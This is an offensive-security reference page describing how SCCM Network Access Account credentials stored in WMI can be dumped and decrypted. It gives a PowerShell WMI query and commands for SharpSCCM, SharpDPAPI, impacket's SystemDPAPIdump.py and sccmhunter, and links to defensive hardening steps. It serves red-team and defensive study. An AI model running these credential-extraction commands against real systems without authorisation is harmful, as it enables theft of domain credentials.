# CRED-3 - WMI Local Secrets

## Document Reference

* [CRED-3](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-3/cred-3\_description.md)

## Description

Dump currently deployed secrets via WMI

The Netwrok Access Account (NAA) is a domain account provisioned on a site server. The NAA account is used by SCCM clients to download software from the distribution point. Otherwise, it serves no other purpose within the configuration.

The NAA accounts are stored within the CCM\_NetworkAccessAccount class located in  the WMI namespace `root\ccm\policy\Machine\ActualConfig`&#x20;

The class contains two attributes which are effectively stored credential data these are:

* NetworkAccessUsername
* NetworkAccessPassword

These values contains encrypted data for values within them. With local administrative privileges, its possible to utilize tools such as SharpSCCM and SharpDPAPI to decrypt the data blocks and retrieve the credentials for the currently configured NAA.

## Requirements

* Local administrator privileges on an SCCM client

To discover if any NAA credentials are stored locally, the following PowerShell command can be executed.

```powershell
Get-WmiObject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"
```

The following tools can be used to extract this information from the system.

## Windows

### SharpSCCM

```
SharpSCCM.exe local secrets -m wmi
```

<figure><img src="../../../.gitbook/assets/2024-04-15_07-04 (1).png" alt=""><figcaption></figcaption></figure>

### SharpDPAPI&#x20;

{% code overflow="wrap" %}
```powershell
SharpDPAPI.exe SCCM
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2155).png" alt=""><figcaption></figcaption></figure>

## Linux

### SystemDPAPIdump.py

Github: [https://github.com/fortra/impacket/blob/755efbffc7bd54c9dcf33d7c5e04038801fd3225/examples/SystemDPAPIdump.py](https://github.com/fortra/impacket/blob/755efbffc7bd54c9dcf33d7c5e04038801fd3225/examples/SystemDPAPIdump.py)

```python
python3 SystemDPAPIdump.py -sccm <domain>/<user>:<pass>@<ip>
```

<figure><img src="../../../.gitbook/assets/image (2147).png" alt=""><figcaption></figcaption></figure>

### sccmhunter

```python
sccmhunter.py -u <User> -p Password> -target <ip>
```

<figure><img src="../../../.gitbook/assets/image (2156).png" alt=""><figcaption></figcaption></figure>

## Defence

* [PREVENT-3: Harden or disable network access accounts](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-3/prevent-3\_description.md)
* [PREVENT-4: Configure Enhanced HTTP](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-4/prevent-4\_description.md)
* [PREVENT-10: Enforce the principle of least privilege for accounts](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-10/prevent-10\_description.md)
